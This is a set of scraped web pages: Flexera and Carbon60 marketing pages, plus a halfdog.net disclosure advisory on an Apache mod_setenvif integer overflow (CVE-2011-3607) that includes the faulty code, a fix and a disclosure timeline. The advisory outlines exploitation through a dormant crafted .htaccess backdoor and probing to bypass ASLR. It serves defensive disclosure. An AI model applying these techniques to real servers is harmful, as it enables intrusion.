=== Content from secunia.com_39fc135a_20250126_073928.html ===


[Skip to main content](#main-content)
[![Home](/themes/custom/flexera/images/logo.svg)](https://www.flexera.com/)

[![Home](/themes/custom/flexera/images/logo.svg)](https://www.flexera.com/)

Search

## Main navigation

* Solutions
  + Column 1
    - Business challenge
      * [Software renewals and audits](https://www.flexera.com/solutions/software-renewals-audits)
      * [Software license management and optimization](https://www.flexera.com/solutions/software-usage-costs)
      * [SaaS spend management](https://www.flexera.com/solutions/saas-spend)
      * [Cloud cost management](https://www.flexera.com/solutions/cloud-cost)
      * [IT asset lifecycle management](https://www.flexera.com/solutions/it-asset-lifecycle)
      * [CMDB data quality](https://www.flexera.com/solutions/cmdb-data-quality)
      * [Accurate IT inventory](https://www.flexera.com/solutions/it-inventory)
      * [Security and regulatory risk management](https://www.flexera.com/solutions/it-security-regulatory-risk)
      * [Sustainable IT](https://www.flexera.com/solutions/sustainable-it)
      * [AI-powered transformation](https://www.flexera.com/solutions/ai-powered-transformation)
      * [Public sector](https://www.flexera.com/solutions/public-sector)
  + Column 2
    - Spend management by vendor
      * [IBM](https://www.flexera.com/solutions/vendor/ibm)
      * [Oracle](https://www.flexera.com/solutions/vendor/oracle)
      * [Microsoft](https://www.flexera.com/solutions/vendor/microsoft)
      * [SAP](https://www.flexera.com/solutions/vendor/sap)
      * [VMware](https://www.flexera.com/solutions/vendor/vmware)
      * [ServiceNow](https://www.flexera.com/solutions/vendor/servicenow)
      * [AWS](https://www.flexera.com/solutions/vendor/aws)
      * [Salesforce](https://www.flexera.com/solutions/vendor/salesforce)
      * [BMC](https://www.flexera.com/solutions/cmdb-data-quality/bmc)
      * [Adobe](https://www.flexera.com/solutions/vendor/adobe)

  ### Achieve more through a united FinOps and ITAM function

  The future is hybrid. Break down the walls between ITAM and FinOps to drive more revenue, more customer growth and more innovation.

  [Discover More](https://www.flexera.com/resources/hybrid-itam-finops)
* Products
  + Column 1
    - [Flexera One](https://www.flexera.com/products/flexera-one)
      * [IT Visibility](https://www.flexera.com/products/flexera-one/it-visibility)
      * [ITAM](https://www.flexera.com/products/flexera-one/it-asset-management)
      * [SaaS Management](https://www.flexera.com/products/flexera-one/saas-management)
      * [FinOps](https://www.flexera.com/products/flexera-one/finops)
      * [Technology Intelligence Platform](https://www.flexera.com/products/flexera-one/technology-intelligence-platform)
  + Column 2
    - [Snow Atlas](https://www.flexera.com/products/snow-atlas)
      * [Snow Spend Optimizer](https://www.flexera.com/products/snow-atlas/snow-spend-optimizer)
      * [Snow SaaS Management](https://www.flexera.com/products/snow-atlas/snow-saas-management)
  + Column 3
    - Hide group
      * [Security](https://www.flexera.com/products/security)
      * [Application Readiness](https://www.flexera.com/products/adminstudio)
      * [All products](https://www.flexera.com/products)
      * [All Snow products](https://www.flexera.com/products/snow)
      * [Integrations](https://www.flexera.com/products/integrations)

  ### Flexera 2024 State of the Cloud Report

  What do transformative initiatives such as GenAI, machine learning and sustainability mean for the cloud? Check out the 2024 State of the Cloud Report to find the answer as well as all the latest cloud computing trends.

  [View Report](https://info.flexera.com/CM-REPORT-State-of-the-Cloud)
* Success
  + Column 1
    - [Customer success](https://www.flexera.com/customer-success)
      * Support
        + [Flexera support portal](https://community.flexera.com/s/support-hub)
        + [Flexera product documentation](https://docs.flexera.com)
        + [Snow product documentation](https://docs.snowsoftware.io/)
      * Services and training
        + [Services](https://www.flexera.com/customer-success/services)
        + [Training](https://www.flexera.com/customer-success/training)
  + Column 2
    - Hide group
      * [Technology Intelligence Awards](https://www.flexera.com/customer-success/awards)
      * [Flexera community](https://community.flexera.com/s/)

  ### Insights from Gartner®

  Find a curated series of actionable and objective insights for IT executives and their teams. Get expert insights from valued analysts, courtesy of Flexera.

  [Discover More](https://www.flexera.com/resources/gartner-analyst-research)
* Resources
  + Column 1
    - [Resources](https://www.flexera.com/resources)
      * [Webinars](https://www.flexera.com/resources?type%5Bwebinar%5D=webinar)
      * [Videos](https://www.flexera.com/resources?type%5Bvideo%5D=video)
      * [Datasheets](https://www.flexera.com/resources?type%5Bdatasheet%5D=datasheet)
      * [White papers & reports](https://www.flexera.com/resources?type%5Bwhite-paper-industry-report%5D=white-paper-industry-report)
  + Column 2
    - Hide group
      * [Blog](/blog/)
      * [Case studies](https://www.flexera.com/resources/case-studies)
      * [Events](https://www.flexera.com/resources?type%5Bevent%5D=event)
      * [Analyst Research](https://www.flexera.com/resources/gartner-analyst-research)
      * [Glossary](https://www.flexera.com/resources/glossary)
      * [Demos & trials](https://www.flexera.com/resources?type%5Bdemo-trials%5D=demo-trials)
      * [Business value calculator](https://www.flexera.com/resources/business-value-calculator)

  ### Flexera 2025 IT Priorities Report

  Insights from Flexera’s 2025 IT Priorities Report highlight what’s top of mind for IT decision makers in the year ahead. Discover the challenges, priorities and opportunities that will shape the future IT landscape.

  [View Report](https://info.flexera.com/ITV-REPORT-IT-Priorities)
* About
  + Column 1
    - [Company](https://www.flexera.com/about-us)
      * [About](https://www.flexera.com/about-us)
      * [Careers](https://www.flexera.com/about-us/careers)
      * [Contact](https://www.flexera.com/about-us/contact-us)
      * [Leadership](https://www.flexera.com/about-us/leadership)
    - [Partners](https://www.flexera.com/about-us/partners)
      * [Partner program](https://www.flexera.com/about-us/partners/partner-program)
      * [Partner directory](https://www.flexera.com/about-us/partners/directory)
  + Column 2
    - [Press center](https://www.flexera.com/about-us/press-center)
      * [Press releases](https://www.flexera.com/about-us/all-press-releases)
      * [Awards](https://www.flexera.com/about-us/press-center#awards)
      * [Articles](https://www.flexera.com/about-us/all-articles)
    - Hide group
      * Social responsibility
        + [ESG](https://www.flexera.com/about-us/environmental-social-governance)
        + [Diversity](https://www.flexera.com/about-us/diversity)

  ### More value with technology intelligence

  The unparalleled synergy of Flexera and Snow provides the Technology Intelligence you need for more efficiency, insight and governance than ever before.

  [Discover More](https://www.flexera.com/more-value-with-technology-intelligence)

Search

en

* [English](https://www.flexera.com/products/security/software-vulnerability-research/secunia-research?referrer=secunia)
* [Deutsch](https://www.flexera.de/products/security/software-vulnerability-research/secunia-research?referrer=secunia)

## External Links

* External Links
  + [Community](https://community.flexera.com/)
  + [Product Access](https://app.flexera.com/login)
  + [Partner Portal](https://flexera.channeltivity.com/Login)

[Book a demo](/about-us/contact-us?C_Interest1=sales)

# Secunia Research

## The world’s best vulnerability intelligence

The Secunia Research team from Flexera provides the most accurate and reliable source of vulnerability intelligence.

[Contact Us](https://www.flexera.com/about-us/contact-us?C_Interest1=sales&C_SolutionInterest=SVM)
Watch video (0:29)

Related links

* [Anatomy of a security advisory](https://www.flexera.com/resources/infographics/anatomy-of-a-security-advisory)
* [Software Vulnerability Research](https://www.flexera.com/products/software-vulnerability-research)
* [Software Vulnerability Manager](/products/software-vulnerability-manager)
* [Security advisories from Secunia Research](https://www.flexera.com/products/security/software-vulnerability-advisories)
* [Report a vulnerability](https://www.flexera.com/about-us/contact-us/report-vulnerability)

 ![Secunia Research](/sites/default/files/2022-04/hero-secunia-research-bg.jpg)

Featured Details

## Multiple ways to consume Secunia Research

Secunia delivers software security research that provides reliable, curated and actionable vulnerability intelligence. Organizations can expect to receive standardized, validated and enriched vulnerability research on a specific version of a software product. Secunia Research supports four solutions:

![Software Vulnerability Research](/sites/default/files/2022-04/icon-secunia-research-svr.svg)

### [Software Vulnerability Research](https://www.flexera.com/products/software-vulnerability-research)

Software Vulnerability Research utilizes Secunia Research to drive awareness of vulnerabilities matching your specified criteria

[Learn More](https://www.flexera.com/products/software-vulnerability-research)

![Software Vulnerability Manager](/sites/default/files/2022-04/icon-secunia-research-svm.svg)

### [Software Vulnerability Manager](/products/software-vulnerability-manager)

Software Vulnerability Manager uses Secunia Research data to identify, prioritize and patch known vulnerable software detected in your environment

[Learn More](/products/software-vulnerability-manager)

![Data Platform](/sites/default/files/2022-04/icon-secunia-research-dp.svg)

### [Data Platform](https://www.flexera.com/products/data-platform)

Data Platform leverages Secunia Research to provide high-level insights based on major or minor versions of software in your normalized inventory

[Learn More](https://www.flexera.com/products/data-platform)

![Flexera One](/sites/default/files/2022-04/icon-secunia-research-flexera-one.svg)

### [Flexera One](/flexera-one)

Flexera One utilizes Secunia Research (alongside public NVD data) to provide more granular matching of build-level versions of software in your normalized inventory within its IT Asset Management and IT Visibility solutions

[Learn More](/flexera-one)

How it works

## Accurate, reliable vulnerability insights at your fingertips

The Secunia Research team from Flexera is comprised of several security specialists who conduct vulnerability research in various products in addition to testing, verifying and validating public vulnerability reports. Since its inception in 2002, the goal of the Secunia Research team is to provide the most accurate and reliable source of vulnerability intelligence.

Delivering the world’s best vulnerability intelligence requires skill and passion. Team members continually develop their skills exploring various high-profile closed and open-source software using a variety of approaches, focusing chiefly on thorough code audits and binary analysis. The team has received industry recognition, including naming members to [Microsoft’s Most Valuable Security Researchers](https://msrc-blog.microsoft.com/2019/08/07/announcing-2019-msrc-most-valuable-security-researchers/) list.

Secunia researchers discover hard-to-find vulnerabilities that aren’t normally identified with techniques such as fuzzing, and the results have been impressive. Members of the Secunia Research team have discovered critical vulnerabilities in products from vendors including Microsoft, Symantec, IBM, Adobe, RealNetworks, Trend Micro, HP, Blue Coat, Samba, CA, Mozilla and Apple.

The team produces invaluable security advisories based on research of the vulnerabilities affecting any given software update. Sometimes a single update can address multiple vulnerabilities of varying criticalities and threats; but these advisories aggregate and distill findings down to a single advisory perfect for the prioritization of patching efforts within [Software Vulnerability Manager](/products/software-vulnerability-manager). Criticality scores are consistently applied along with details around attack vector and other valuable details within [Software Vulnerability Research](/products/software-vulnerability-research/secunia-research). Illegitimate vulnerability reports are also investigated and rejected so you can focus only on what truly matters.

Informing IT, Transforming IT

## Industry insights to help keep you informed

[#### Webinar

### Stay Ahead of Cyber Threats: Flexera's Latest Vulnerability Insights

Join us for this session where we'll explore the latest findings from the Flexera Monthly Vulnerability Insights Report.](https://info.flexera.com/SVM-WBNR-Vulnerability-Insights-Roundtable)

[#### Webinar

### Dive deeper into the Flexera Annual Vulnerability Insights

We'll explore the key findings from the Flexera Annual Vulnerability Insights Report. Learn about the latest cybersecurity trends, the most targeted industries, the types of vulnerabilities, plus management and mitigation strategies.](https://info.flexera.com/SVM-WBNR-Flexera-Annual-Vulnerability-Insights?lead_source=Website%20Visitor&id=Flexera.com-Resources)

#### Video

### Close the Risk Window with Software Vulnerability Manager

Stop reacting. Gain control. Stay secure. Build a more effective risk mitigation process leveraging Secunia Research vulnerability intelligence and the largest repository of third-party patch data in the industry.

Remote video URL

[#### Trial

### Software Vulnerability Manager Assessment free trial

Get access to the complete set of modules of Software Vulnerability Manager: Research, Assessment and Patching](https://info.flexera.com/SVM-EVAL-Software-Vulnerability-Manager)

[#### Datasheet

### Protect your ServiceNow® investment with the highest quality data

IT Visibility offers certified ServiceNow integrations that accelerate platform expansion, improve ROI and increase efficiencies across ITIL processes by delivering clean software and hardware asset data directly.](/sites/default/files/datasheet-itv-maximize-servicenow-investment.pdf)

[#### Blog

### Avoid missing crucial vulnerability intelligence amid NVD backlog

Recent developments regarding the National Vulnerability Database (NVD) have some technology leaders on edge. Since February, the U.S. National Institute of Standards and Technology (NIST) has almost completely stopped enriching software vulnerabi...](https://www.flexera.com/blog/vulnerability-management/avoid-missing-crucial-vulnerability-intelligence-amid-nvd-backlog/)

[View all resources](https://www.flexera.com/resources?category%5Bsoftware-vulnerability-management%5D=software-vulnerability-management)

## Footer Menu

* Column
  + Business challenge
    - [Software renewals and audits](https://www.flexera.com/solutions/software-renewals-audits)
    - [Software license management and optimization](https://www.flexera.com/solutions/software-usage-costs)
    - [SaaS spend management](https://www.flexera.com/solutions/saas-spend)
    - [Cloud cost management](https://www.flexera.com/solutions/cloud-cost)
    - [IT asset lifecycle management](https://www.flexera.com/solutions/it-asset-lifecycle)
    - [CMDB data quality](https://www.flexera.com/solutions/cmdb-data-quality)
    - [Accurate IT inventory](https://www.flexera.com/solutions/it-inventory)
    - [Security and regulatory risk management](https://www.flexera.com/solutions/it-security-regulatory-risk)
    - [Sustainable IT](https://www.flexera.com/solutions/sustainable-it)
    - [AI-powered transformation](https://www.flexera.com/solutions/ai-powered-transformation)
    - [Public sector](https://www.flexera.com/solutions/public-sector)
* Column
  + Spend management by vendor
    - [IBM](https://www.flexera.com/solutions/vendor/ibm)
    - [Oracle](https://www.flexera.com/solutions/vendor/oracle)
    - [Microsoft](https://www.flexera.com/solutions/vendor/microsoft)
    - [SAP](https://www.flexera.com/solutions/vendor/sap)
    - [VMware](https://www.flexera.com/solutions/vendor/vmware)
    - [ServiceNow](https://www.flexera.com/solutions/vendor/servicenow)
    - [AWS](https://www.flexera.com/solutions/vendor/aws)
    - [Salesforce](https://www.flexera.com/solutions/vendor/salesforce)
    - [BMC](https://www.flexera.com/solutions/cmdb-data-quality/bmc)
    - [Adobe](https://www.flexera.com/solutions/vendor/adobe)
* Column
  + Products
    - [Flexera One](https://www.flexera.com/products/flexera-one)
    - [Snow Atlas](https://www.flexera.com/products/snow-atlas)
    - [Security](https://www.flexera.com/products/security)
    - [Application Readiness](https://www.flexera.com/products/adminstudio)
    - [All products](https://www.flexera.com/products)
    - [All Snow products](https://www.flexera.com/products/snow)
    - [Integrations](https://www.flexera.com/products/integrations)
* Column
  + Company
    - [About](https://www.flexera.com/about-us)
    - [Careers](https://www.flexera.com/about-us/careers)
    - [Leadership](https://www.flexera.com/about-us/leadership)
    - [Contact us](https://www.flexera.com/about-us/contact-us)
    - [Media / press center](https://www.flexera.com/about-us/press-center)
    - [Revenera.com](https://www.revenera.com)

 +1.800.374.4353

en

* [English](https://www.flexera.com/products/security/software-vulnerability-research/secunia-research?referrer=secunia)
* [Deutsch](https://www.flexera.de/products/security/software-vulnerability-research/secunia-research?referrer=secunia)

 [![Home](/themes/custom/flexera/images/logo.svg)](https://www.flexera.com/)

© 2025 Flexera. All Rights Reserved.

## Footer

* [Privacy Policy](https://www.flexera.com/legal/privacy-policy)
* [Terms and conditions](https://www.flexera.com/legal)
* [Contact Us](https://www.flexera.com/about-us/contact-us)
* [Impressum](https://www.flexera.com/about-us/impressum)
* [Site Map](https://www.flexera.com/sitemap)

#####

×

...



=== Content from bugzilla.novell.com_45bd44a1_20250126_073927.html ===




=== Content from www.halfdog.net_f55126b4_20250125_085122.html ===

[www.halfdog.net](/) /
[Security](/Security/) /
[2011](/Security/2011/) / ApacheModSetEnvIfIntegerOverflow /

Share via
[f](https://www.facebook.com/sharer.php?u=https%3A%2F%2Fwww.halfdog.net%2FSecurity%2F2011%2FApacheModSetEnvIfIntegerOverflow%2F&t=Apache%20modSetEnvIf%20Integer%20Overflow%20CVE-2011-3607 "facebook")
[g+](https://plus.google.com/share?url=https://www.halfdog.net/Security/2011/ApacheModSetEnvIfIntegerOverflow/ "google+")
# Background

The Apache HTTP Server is an open-source HTTP server for modern
operating systems including UNIX, Microsoft Windows, Mac OS/X and
Netware. The goal of this project is to provide a secure, efficient
and extensible server that provides HTTP services observing the
current HTTP standards. Apache has been the most popular web server
on the Internet since April of 1996.

# Problem Description

During routine testing, an integer overflow was found in
apache2-mpm-worker 2.2.19 in the function ap\_pregsub called
from mod-setenvif. The issue affects all versions from 2.0.x
to 2.0.64 and 2.2.x to 2.2.21, not depending on the mode of
operation (worker, prefork, ..).
When a header field is mangled using *SetEnvIf*, the new
environment variable data can be multiples of the size of the
submitted header field. When *ap\_pregsub* from *server/util.c*
calculates the buffer size using

else if (no < nmatch && pmatch[no].rm\_so < pmatch[no].rm\_eo) {
len += pmatch[no].rm\_eo - pmatch[no].rm\_so;
}

the length value overflows and is used in a subsequent allocation
call of buffer too small:

dest = dst = apr\_pcalloc(p, len + 1);

The subsequent filling of the buffer with user-supplied data leads
to buffer overflow. Even without overflowing, the allocation of
significant amounts of server memory for excessivly large environment
variables should be considered a problem also.

# Impact

Depending on the input data, exploitation of this issue leads
to:

* allocation of large quantities of server memory, killing processes
  due to out-of-memory conditions or reducing system performance to
  crawl due to massive swapping.
* invalid memory access when copying more than 4GB of data
  into the much smaller buffer. Since the loop copying the data uses
  only stack and libc-heap, not the apr pool, for source and destination
  addresses, copy process is linear, starting at low address and
  pool is separated by unaccessible memory pages for protection
  on linux. Usually this will only cause termination
  of the apache process, which is restarted automatically. The impact
  is increased system load and DOS-condition while under attack.
* At least with multi-threaded server (worker), arbitrary code
  execution is proven, on single-threaded varians, the use of crafted
  stop-sequences might allow code execution even on these systems.
  On many systems ASLR will reduce the efficiency of the attack,
  but even with ASLR enabled, the automatic restart of processes
  allows to probe for all possible mappings of libc. An attacker,
  that has already access to another account on the machen, might
  be able to use
  [ApacheNoFollowSymlinkTimerace](../ApacheNoFollowSymlinkTimerace/)
  to learn the memory map of the process, thus having the posibility
  to reach nearly 100% efficiency.

To trigger this issue, mod\_setenvif must be enabled and the
attacker has to be able to place a crafted *.htaccess* file
on the server. Since the triggering of the exploit might depend
on a *magic header field*, the malicious *.htaccess*
might be placed as backdoor in web-content .zip files or could
be stored dormant on the server until activation by the
corresponding magic request.

# Workaround

On workaround is to disable the module when not needed. Another one
is to disable use of *.htaccess* on all user-modificable locations
by setting *AllowOverride None* on all corresponding directories.

# Solution

The fix for the integer overflow in ap\_pregsub (server/util.c,)
is tivial, e.g.

oldlen=len=0
else if (no < nmatch && pmatch[no].rm\_so < pmatch[no].rm\_eo) {
len += pmatch[no].rm\_eo - pmatch[no].rm\_so;
// Return NULL on error
if(len<oldlen) return(NULL);
}

Apart from the overflow, a discussion on reasonable sizes for
environment variables should be started to deal with the memory
consumption problem. Without limits, another problematic section
is in ap\_pregsub (server/util.c,) should be fixed also. At the
moment, the return value from from apr\_pcalloc is not checked,
leading to a NULL-pointer dereference. Fix

dest = dst = apr\_pcalloc(p, len + 1);
if(!dest) return(NULL);

# Timeline

* 20110715: Initial discovery, report to apache security
* 20110716: Ubuntu bug report [811422](https://bugs.launchpad.net/ubuntu/%2Bsource/apache2/%2Bbug/811422)
* 20111011: Feedback from apache security, impact low, go ahead with
  preparation of advisory.
* 20111031: Feedback from apache security on advisory, OK for public release
* 20111102: Public release via bugtraq and full disclosure
# References

## Problem description and discussion:

* Apache-dev mailing list: really good discussion on aspects of
  regular expression handling in ap\_pregsub: <https://www.gossamer-threads.com/lists/apache/dev/403775>
* Demo exploit: <DemoExploit.html>
* CVEs: [CVE-2011-3607](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-3607) (integer overflow),
  [CVE-2011-4415](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-4415) (resource consumption, NULL-deref)
* AUScert: [15388](https://auscert.org.au/15388)
* OSVDB: [76744](http://osvdb.org/show/osvdb/76744)
* Secunia Advisory: [SA45793](https://secunia.com/advisories/45793/)
* ISS Xforce: [71093](http://xforce.iss.net/xforce/xfdb/71093)
* SecurityFocus: [50494](https://www.securityfocus.com/bid/50494)
* NsFocus: [18110](http://www.nsfocus.net/vulndb/18110)
* Sebug.Net: [23169](http://sebug.net/vulndb/23169/)
* Linux Magazin: [roundup with into to mod\_setenvif (german)](https://www.linux-magazin.de/Blogs/Insecurity-Bulletin/Apache-Webserver-Attacke-mit-.htaccess)

## Bug Tracking and Fixing:

* Novell bug reports:
  [729181](https://bugzilla.novell.com/show_bug.cgi?id=729181) (CVE-2011-3607),
  [729183](https://bugzilla.novell.com/show_bug.cgi?id=729183) (CVE-2011-4415)
* Redhat bug report: [750935](https://bugzilla.redhat.com/show_bug.cgi?id=750935)
* Ubuntu bug report: [811422](https://bugs.launchpad.net/ubuntu/%2Bsource/apache2/%2Bbug/811422)
* apache bug ID?
* apache.org fix for [CVE-2011-3607](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-3607): [Svn revision 1198940](https://svn.apache.org/viewvc?view=revision&revision=1198940) (20111107)

Last modified 20171228
Contact e-mail: me (%) halfdog.net



=== Content from www.gossamer-threads.com_941f41c5_20250125_085122.html ===


Carbon60 Named a VMware Cloud Service Provider Pinnacle Tier Partner

[Read More](/blog/managed-hosting/vmware-cloud-service-provider-pinnacle-tier-partner%20)

* [Skip to primary navigation](#genesis-nav-primary)
* [Skip to main content](#genesis-content)

[![Carbon60](data:image/gif;base64...)![Carbon60](https://www.carbon60.com/wp-content/uploads/2024/06/cropped-C60-Logo-New-Coloured.png)](https://www.carbon60.com/)

Carbon60

The Managed Cloud Difference

* [Show Search](#header-search-wrap)
* [Contact Us](https://www.carbon60.com/contact-us)* [Get Started](/sales-request)
Search this website Hide Search

* [Managed Private Cloud](https://www.carbon60.com/managed-infrastructure/managed-private-cloud)[Managed Private Cloud](https://www.carbon60.com/managed-infrastructure/managed-private-cloud)
  + [Managed Hosting](https://www.carbon60.com/managed-infrastructure/managed-private-cloud/managed-hosting)
  + [Dedicated Private Cloud](https://www.carbon60.com/managed-infrastructure/dedicated-private-cloud)
  + [Managed Edge Cloud](https://www.carbon60.com/managed-infrastructure/edge-computing)
  + [Cloud Backup](https://www.carbon60.com/managed-infrastructure/managed-private-cloud/backup)
  + [Cloud Disaster Recovery](https://www.carbon60.com/cloud-disaster-recovery)
  + [Microsoft 365 Backup](/managed-cloud/cloud-backup#M365backup)
  + [Cloud Disaster Recovery](https://www.carbon60.com/cloud-disaster-recovery)
* [Managed Public Cloud](https://www.carbon60.com/managed-public-cloud)[Managed Public Cloud](https://www.carbon60.com/managed-public-cloud)
  + [AWS Managed Services](https://www.carbon60.com/managed-infrastructure/aws-managed-operations)
  + [Azure Managed Services](https://www.carbon60.com/managed-infrastructure/azure-managed-operations)
  + [VMware Cloud on AWS](https://www.carbon60.com/managed-public-cloud/vmware-aws)
  + [Azure Virtual Desktop](https://www.carbon60.com/managed-infrastructure/azure-virtual-desktop)
  + [Microsoft 365](https://www.carbon60.com/managed-public-cloud/microsoft-365)
* [Managed Security](https://www.carbon60.com/cloud-security)[Managed Security](https://www.carbon60.com/cloud-security)
  + [Managed Risk](/managed-cloud/cloud-security#managed-risk)
  + [Managed Detection & Response](/managed-cloud/cloud-security#mdr)
  + [Managed Security Awareness](/managed-cloud/cloud-security#msa)
  + [Incident Response Retainer](/managed-cloud/cloud-security#securityscorecard)
  + [SIEM](/managed-cloud/cloud-security#SIEM)
  + [Penetration Testing](https://www.carbon60.com/cloud-security/penetration-testing)
  + [Vulnerability Management](/managed-cloud/cloud-security#vulnerability-management)
  + [Endpoint Protection](/managed-cloud/cloud-security#endpoint-protection)
  + [Web Application Firewall](/managed-cloud/cloud-security#web-application-firewall)
* [Migration Services](https://www.carbon60.com/migration-services)[Migration Services](https://www.carbon60.com/migration-services)
  + [Cloud Readiness Assessment](/cloud-consulting/cloud-readiness-assessment)
  + [Cloud Migration](/cloud-consulting/cloud-migration)
  + [Cloud Advisory](https://www.carbon60.com/professional-services/cloud-advisory)
  + [Cloud Security & Compliance](https://www.carbon60.com/cloud-compliance)
* [Industries](https://www.carbon60.com/industries)[Industries](https://www.carbon60.com/industries)
  + [Financial Services](https://www.carbon60.com/industries/finance)
  + [Healthcare](https://www.carbon60.com/industries/healthcare)
  + [Public Sector](https://www.carbon60.com/industries/public-sector)
  + [Technology](https://www.carbon60.com/industries/technology)
* [About](https://www.carbon60.com/about)[About](https://www.carbon60.com/about)
  + [Leadership](https://www.carbon60.com/about/leadership)
  + [About Carbon60](https://www.carbon60.com/about/carbon60)
  + [Careers](https://www.carbon60.com/about/careers)
  + [News](https://www.carbon60.com/news)
  + [Partners](https://www.carbon60.com/cloud-partners)
  + [Insights](https://www.carbon60.com/insights)
* [Contact Us](https://www.carbon60.com/contact-us)
* [Get Started](https://www.carbon60.com/sales-request)
# Canada’s Leading Managed Cloud Service Provider

## Cloud Simplified

Don’t let the burden of cloud management hold you back. Our managed cloud services, delivered by cloud experts with 24×7 white-glove support, simplify cloud management so you can focus on what drives your business.

[Get Started](#c60-talk-to-an-expert)

## About Carbon60

### We Help Organizations Manage Cloud Environments With Ease

In today’s dynamic technology landscape, having a secure and scalable cloud environment is table stakes for organizations to remain **agile, innovative, and competitive.**

#### At Carbon60, we’re passionate about helping more Canadian organizations operate successfully in the cloud.

We take care of all aspects of your cloud management needs, offering **streamlined solutions for complex workloads that enhance performance and efficiency.**

Gain peace of mind knowing that your cloud environment is **secure, compliant, and optimized**. You can focus your resources on running your business and evolving confidently while we handle the heavy lifting.

Carbon60 is the partner you can trust to **deliver reliable and flexible cloud-based solutions with the highest level of accountability and service quality,** all with our white-glove dedicated support available 24x7x365.

[Learn More](#c60-talk-to-an-expert)

## Testimonials

### See What Our Clients Have to Say

“Carbon60 has been a trusted partner of our IT team for many years. Carbon60 allows me to focus on the business while they manage our mission-critical infrastructure, ensuring operations are
continuously up and running. Carbon60’s quality of service and support is second to none!”

‐ CIO of a Financial Services Company

“MediResource has grown and matured along with Carbon60 as we implement security and change control policies that keep our data safe and achieve high availability for our applications.”

‐ Lisa Heath, CEO, MediResource Inc.

## Unmatched Cloud Capabilities to Help You Unleash the Power of the Cloud for Your Business

Carbon60 offers award-winning solutions tailored to your unique business needs.

### [Managed Private Cloud](/managed-private-cloud)

Powered by [VMware](/cloud-partners/vmware), our private cloud services deliver enterprise-grade infrastructure management, built to meet your business needs.

[Learn More](/managed-private-cloud)

### [Managed Public Cloud](/managed-public-cloud)

Our managed public cloud services will give you 24×7 peace of mind, with full end-to-end support to ensure your cloud environment remains secure, compliant, agile, reliable, and fast.

[Learn More](/managed-public-cloud)

### [Cloud Security](/managed-security-compliance/)

We’re trusted by governments and businesses with complex performance, compliance, and privacy requirements and have the expertise required to keep your data safe and secure.

[Learn More](/managed-security-compliance/)

### [Cloud Migration](/migration-services)

When it comes to planning your cloud migration, navigating the complexities can be challenging. However, our team of cloud experts is here to help streamline the process and accelerate your digital transformation journey.

[Learn More](/migration-services)

## The Carbon60 Difference

### 20+ Years of Experience

We have a long history of providing exceptional managed cloud solutions to public and private sector organizations to empower them to evolve confidently in the cloud.

### Best-in-Practice Security & Compliance

Security is at the heart of all of our cloud solutions. We take a holistic approach to improving your security posture so you can feel confident that your critical infrastructure and endpoints are protected.

### 24x7x365 Support

Our white-glove service is available around the clock so you can ensure uninterrupted productivity, efficiency, and fast resolution in the event of an emergency.

### Cloud Experts

Our team of 160 certified cloud specialists has advanced industry knowledge and expertise ready to help you navigate your digital transformation journey.

## Our Success Stories

### Modernizing the IT Infrastructure of a Leading Financial Services Company

Thanks to Carbon60, the client achieved the IT environment necessary to meet their current performance needs, with plenty of room to grow as the business expands.

[Read More](/wp-content/uploads/2021/11/Carbon60-Case-Study-Financial-Services-Company-Web-Version-2023.pdf)

### Designing A Managed Hosting Solution For A Biopharmaceutical Machinery Company

Carbon60 designed a fully managed hosting solution on its VMware-powered cloud platform so our client could focus on other priorities related to the COVID-19 pandemic…

[Read More](/wp-content/uploads/2021/11/Carbon60-Case-Study-Pharma-Manufacturing-Web-Version.pdf)

## Cloud Certifications

### 100+ Certifications Across All Major Cloud Providers

Carbon60 is proud to be an [AWS Premier Partner](/cloud-partners/aws-partner), [Microsoft Azure Gold Partner](/partners/microsoft-azure), and one of the largest [VMware service provider](/cloud-partners/vmware) partners in Canada.

[![AWS Advanced Consulting Partner](data:image/gif;base64...)![AWS Advanced Consulting Partner](https://www.carbon60.com/wp-content/uploads/2023/10/logo-aws-advance-tier-partner.svg)](/cloud-partners/aws-partner)

[![Microsoft Azure Gold Partner](data:image/gif;base64...)![Microsoft Azure Gold Partner](https://www.carbon60.com/wp-content/uploads/2023/10/logo-microsoft-gold-partner.svg)](/cloud-partners/microsoft-azure)

[![VMware Partner](data:image/gif;base64...)![VMware Partner](https://www.carbon60.com/wp-content/uploads/2023/10/logo-vmware-partner.svg)](/cloud-partners/vmware)

## Services & Solutions

### Cloud Solutions for Every Step of Your Cloud Journey

**No matter your cloud needs**, we have the cloud solutions to your challenges to help you get the most out of your cloud infrastructure — all with our signature white-glove service.

### [Managed VMware Private Cloud](/managed-private-cloud)

Fully managed private cloud computing services powered by VMware.

### [Managed Public Cloud](/managed-public-cloud)

Managed AWS and Microsoft Azure services.

### [Managed Cloud Security](/managed-security-compliance)

Managed security services based on the NIST cybersecurity framework for core standards, guidelines, and best practices.

### [Cloud Advisory](/migration-services/cloud-advisory)

Guidance and support to help you gain a deeper understanding of cloud technology and how it accelerates value for your organization.

### [Cloud Readiness Assessment](/migration-services/cloud-assessment)

A sustainable and comprehensive roadmap for your cloud journey, geared toward cloud management and security.

### [Cloud Migration](/migration-services/cloud-migration)

Expert cloud migration services to help you move complex workloads to the right cloud environment.

### [Azure Virtual Desktop](/managed-public-cloud/azure-virtual-desktop)

Managed Azure Virtual Desktop to help you streamline your IT infrastructure and deliver secure, remote desktop experiences, enabling employees to work from anywhere.

### [VMware Cloud on AWS](/managed-public-cloud/vmware-aws)

Managed VMC on AWS so you can maintain your existing VMware investments, tools and processes while tapping into the scale and features that AWS provides.

### [Managed Edge Cloud](/managed-private-cloud/edge-cloud)

Managed Edge Cloud services to bring computing power closer to the point of data generation, providing faster processing speeds and improved efficiency.

### [Disaster Recovery](/managed-private-cloud/disaster-recovery)

DR-as-a-Service built on our hosting platform with direct integration into Zerto’s replication software.

### [Backup](/managed-private-cloud/backup)

Cloud backup and Microsoft 365 backup services to keep your data protected.

### [Microsoft 365](/managed-public-cloud/microsoft-365)

A comprehensive suite of powerful tools and services designed to empower your organization.

## Industries

### Proven Success in Many Industries

Our specialized expertise and experience allow us to confidently navigate complex regulatory and security requirements to help highly regulated companies achieve cloud success. We’ve seen it all, and we know how to handle it.

### [Finance](/industries/financial-services)

### [Healthcare](/industries/healthcare)

### [Public Sector](/industries/public-sector)

### [Technology](/industries/technology)

## Blog

### Related Resources & Insights

[July 19, 2024
### Global CrowdStrike Outage Impacting Services Update](https://www.carbon60.com/blog/crowdstrike-outage-impacting-services-update)

